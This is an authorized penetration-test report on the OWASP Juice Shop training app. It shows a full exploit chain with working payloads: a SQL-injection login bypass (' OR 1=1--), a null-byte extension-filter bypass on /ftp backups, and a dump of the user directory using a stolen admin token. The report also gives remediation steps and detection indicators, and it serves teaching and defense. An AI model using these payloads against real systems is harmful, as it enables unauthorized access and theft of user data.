---
title: Juice Shop Assessment 2026-07-23
type: security-assessment
target: OWASP Juice Shop v20.1.1 @ localhost:3000
date: 2026-07-23
authorization: authorized lab / deliberately-vulnerable training target
tools: Crossview (MITRE silo + osv-scanner), nmap, curl
tags: [security, pentest, sca, mitre, kill-chain]
---

# Juice Shop Assessment — 2026-07-23

**Target:** OWASP Juice Shop **v20.1.1** on `http://localhost:3000` (Node/Express SPA).
**Scope:** authorized, non-persistent testing of a deliberately-vulnerable training app. No writes, no data mutation, no persistence.
**Tooling:** Crossview MITRE silo (`crossview show`) + bundled `osv-scanner`, plus `nmap`/`curl`.

## 1. Executive summary

A full unauthenticated-to-admin kill chain was proven end-to-end in minutes. An exposed FTP backup directory leaks source artifacts (bypassing a weak extension filter via a Poison Null Byte), a classic SQL-injection logs an attacker in as **admin** with no password, and the resulting RS256 token dumps the entire user directory. Dependency SCA on the leaked lockfile surfaced **184 unique CVEs across 144 packages** — a large latent supply-chain surface dominated by prototype-pollution and template-injection primitives.

| #   | Finding                                                                 | Severity     | CWE                           | Status          |
| --- | ----------------------------------------------------------------------- | ------------ | ----------------------------- | --------------- |
| F1  | SQLi authentication bypass → admin                                      | **Critical** | CWE-89                        | ✅ Exploited     |
| F2  | Poison-Null-Byte access-control bypass on `/ftp` backups                | **High**     | CWE-22 / CWE-158              | ✅ Exploited     |
| F3  | Broken object-level auth — full user directory dump                     | **High**     | CWE-639 / CWE-284             | ✅ Exploited     |
| F4  | 184 CVEs in dependencies (proto-pollution, JWT confusion, template RCE) | **High**     | CWE-1321 / CWE-347 / CWE-1035 | ✅ SCA-confirmed |
| F5  | Wildcard CORS (`Access-Control-Allow-Origin: *`)                        | Medium       | CWE-942                       | ✅ Observed      |
| F6  | Directory listing + open Swagger (`/ftp/`, `/api-docs/`)                | Low/Info     | CWE-548                       | ✅ Observed      |

## 2. Recon & attack surface

- `nmap -sV` → `:3000` open, Express; version endpoint `/rest/admin/application-version` → **20.1.1**.
- Response headers: `Access-Control-Allow-Origin: *`, `X-Recruiting: /#/jobs`, `X-Frame-Options: SAMEORIGIN`, `X-Content-Type-Options: nosniff`.
- `/ftp/` returns a **directory listing** (robots.txt disallows it but does not restrict it): `package-lock.json.bak`, `package.json.bak`, `coupons_2013.md.bak`, `incident-support.kdbx`, `encrypt.pyc`, `eastere.gg`, `suspicious_errors.yml`, `announcement_encrypted.md`.
- `/api-docs/` (Swagger UI) → HTTP 200, unauthenticated.

## 3. Confirmed exploit chain (non-persistent)

```
[F6] /ftp/ dir listing            (discovery — CWE-548)
        │
        ▼
[F2] GET /ftp/package-lock.json.bak%2500.md   → 200   (direct .bak → 403)
        │   Poison Null Byte defeats extension allow-list (CWE-22 + CWE-158)
        │   → 750 KB lockfile exfiltrated  ──────────────► feeds §4 SCA
        ▼
[F1] POST /rest/user/login  {"email":"' OR 1=1--","password":"x"}  → 200
        │   SQLi in login query (CWE-89) — auth bypass, no password
        │   returns RS256 JWT: id=1  email=admin@juice-sh.op  role=admin
        ▼
[F3] GET /api/Users   Authorization: Bearer <stolen admin JWT>   → 200
        │   Broken object-level auth (CWE-639/CWE-284)
        ▼   Dumped all 22 users: id, email, role, lastLoginIp, deluxeToken
    (password field IS stripped in v20 — credit where due)
```

**Evidence (verbatim):**
- `POST /rest/user/login` email = `' OR 1=1--` → `HTTP 200`, JWT header `{"typ":"JWT","alg":"RS256"}`, payload `id=1 email=admin@juice-sh.op role=admin`.
- Unauthenticated `GET /api/Users` → `401` (good) — but with the stolen token → `200`, **22 user records**.
- Direct `GET /ftp/package-lock.json.bak` → `403`; `…%2500.md` → `200` (extension-filter bypass).

## 4. SCA — dependency analysis (Crossview / osv-scanner)

Source: `package-lock.json.bak` exfiltrated via F2 (a legacy `6.2.0-SNAPSHOT` manifest planted as a backup — 1,458 packages).

- **144** packages with known vulnerabilities · **324** advisories · **184** unique CVEs.
- Worst offenders (advisory count): `tar` (41), `handlebars` (25), `lodash` (23), `minimatch` (15), `js-yaml` (8), `socket.io-parser` (8), `xmldom` (8), `jsonwebtoken` (7), `qs` (7), `sanitize-html` (7), `brace-expansion` (6), `minimist` (6), `tmp` (6), `ajv` (5), `multer` (5).
- Themes: **prototype pollution** (lodash/handlebars/minimist → CWE-1321), **template injection / RCE** (handlebars, `babel-traverse` CVE-2023-45133 CVSS C:H/I:H/A:H), **JWT algorithm/verification issues** (jsonwebtoken → CWE-347), and **ReDoS/DoS** across `tar`, `ajv`, `ansi-regex`.

> Note: this is the *leaked historical* manifest, not the live v20 tree. It nonetheless represents real exposure — a full historical dependency graph handed to an attacker is a roadmap for supply-chain and gadget-chain attacks.

## 5. MITRE kill-chain path tree (Crossview silo)

`crossview show CWE-89` (canonical silo cross-refs, verbatim):
- **parents:** CWE-74 (Injection), CWE-943 (Improper Neutralization in a Data Query)
- **targets / used-by CAPEC:** CAPEC-66 (SQL Injection), CAPEC-7 (Blind SQLi), CAPEC-108/109/110 (Command-Line / ORM / SQLi variants), CAPEC-470

```
UKC phase            ATT&CK                     CAPEC / CWE (Crossview)
─────────────────────────────────────────────────────────────────────
Reconnaissance   →   T1595 Active Scanning      CWE-548 dir listing (/ftp, /api-docs)
Delivery/Access  →   T1190 Exploit Public App   CAPEC-52 Embedding NULL Bytes → CWE-158/CWE-22 (F2)
Exploitation     →   T1190                       CAPEC-66/7 → CWE-89 SQLi (F1)
Priv-Esc/Creds   →   T1550.001 App Access Token  forged admin JWT (role=admin)
Discovery/Coll.  →   T1213 Data from Repos       CAPEC-1 Accessing Functionality → CWE-639 (F3)
Supply-chain     →   T1195.001 Compromise Deps   CWE-1321/CWE-347 latent (§4)
```

## 6. Remediation (priority order)

1. **F1 (SQLi):** replace string-built login query with parameterized queries / ORM bindings. Reject SQL metacharacters at the boundary. *(Root cause — breaks the whole chain.)*
2. **F3 (BOLA):** enforce per-object authorization on `/api/Users`; non-admins must not list other users. Strip `deluxeToken`/`lastLoginIp` from any list response.
3. **F2 (path/null-byte):** canonicalize and null-check paths; serve static backups from an allow-list, never an extension deny-list. Remove `.bak`/`.kdbx`/`.pyc` from `/ftp` entirely.
4. **F4 (SCA):** regenerate the lockfile on current majors; add `osv-scanner`/Dependabot to CI and fail on High+. Prioritize prototype-pollution and `jsonwebtoken` upgrades.
5. **F5/F6:** scope CORS to known origins; disable directory listing; gate Swagger behind auth in non-dev.

## 7. SITREP (SOC)

**2026-07-23 — RED / authorized lab exercise.** Full unauth→admin chain proven against Juice Shop v20.1.1 (`:3000`): `/ftp` null-byte leak → SQLi login bypass (admin JWT) → user-directory dump (22 accounts). SCA: 184 CVEs / 144 pkgs in leaked lockfile. **No persistence, no writes, no live-data impact.** IOCs a real SOC would alert on: `%2500` in `/ftp` URIs (403→200 flip), `' OR 1=1--` in login body, `/api/Users` full-table reads by a freshly-issued token. Cross-refs: [[SIEM Review Log]], [[SOC Live Status]], [[Security Map]].

---
*Method: Crossview MITRE silo + osv-scanner via `nix develop`; live PoCs over curl. Loot dir `/tmp/js-assess/` (ephemeral).*
